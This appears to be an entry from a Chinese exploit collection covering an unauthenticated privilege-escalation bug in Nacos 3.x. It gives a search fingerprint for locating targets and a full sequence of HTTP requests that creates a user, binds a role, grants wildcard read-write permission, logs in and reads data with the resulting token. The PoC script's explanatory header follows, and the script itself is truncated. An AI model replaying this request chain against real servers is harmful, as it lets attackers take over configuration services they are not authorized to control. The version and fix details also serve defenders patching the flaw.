# Nacos3.x.xpermission存在权限绕过漏洞

- **系统**：Nacos　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app.name="Nacos"`
- **请求**：`POST /nacos/v3/auth/user?username=test\&password=1234@test HTTP/1.1`

**请求体 / payload**
```
未授权创建用户
Host:
绑定角色
POST /nacos/v3/auth/role?role=test\_role\&username=test HTTP/1.1
Host:
授予通配权限
POST /nacos/v3/auth/permission?role=test\_role\&resource=\*\&action=rw HTTP/1.1
Host:
登录换取 Token
POST /nacos/v3/auth/user/login?username=test\&password=1234%40test HTTP/1.1
Host:
提权用户带 Token 访问数据面
GET /nacos/v3/admin/ns/service/list?pageNo=1\&pageSize=10\&namespaceId=public\&groupName=DEFAULT\_GROUP HTTP/1.1
Host:
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxNzg3OTE0MjA5fQ.akm\_Qv1wpjsG-Os4LzwIBHkzeMt8CF1ITvDh46Dy4Uw
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nacos 鉴权作用域错配漏洞 PoC（自建管理员账户 → 完全接管服务端）
影响版本 : Nacos 3.0.0 ~ 3.2.3（本 PoC 基于 3.2.3 实测编写）
修复版本 : Nacos 3.2.4（为用户/角色/权限管理 API 的 @Secured 注解补上
apiType = ApiType.ADMIN\_API，使其纳入默认开启的 Admin 鉴权作用域）
漏洞原理（简述）:
Nacos 3.x 将 HTTP 鉴权拆成多个独立作用域:
- OPEN\_API  作用域  -> nacos.core.auth.enabled        (默认 false)
- ADMIN\_API 作用域  -> nacos.core.auth.admin.enabled  (默认 true)
- CONSOLE\_API作用域 -> nacos.core.auth.console.enabled(默认 true)
3.2.3 中用户/角色/权限管理接口 (/v3/auth/user, /v3/auth/role, /v3/auth/permission)
的 @Secured 注解漏标 apiType，默认落入 OPEN\_API 作用域——即由默认关闭的
nacos.core.auth.enabled 把守，默认开启的 Admin 作用域过滤器 (AuthAdminFilter)
因 apiType 不匹配而直接放行。
结果：即便运维按最佳实践开启了 admin/console 鉴权，攻击者仍可在【未授权】
状态下调用 /v3/auth/user 创建账户、调用 /v3/auth/role 绑定自定义角色、调用
/v3/auth/permission 发放 *:* 全量读写权限，随后正常登录获取 accessToken，
即获得与管理员等价的全部权限（读改全部配置、命名空间等）→ 完全接管服务端。
攻击面 : 服务端主端口(默认 8848, context path /nacos)——SDK/gRPC 流量端口，
生产环境通常对内网大范围开放。控制台端口(8080)不受…（脚本共 9911 字，完整版见原文）
```
- **预期**：200　|　—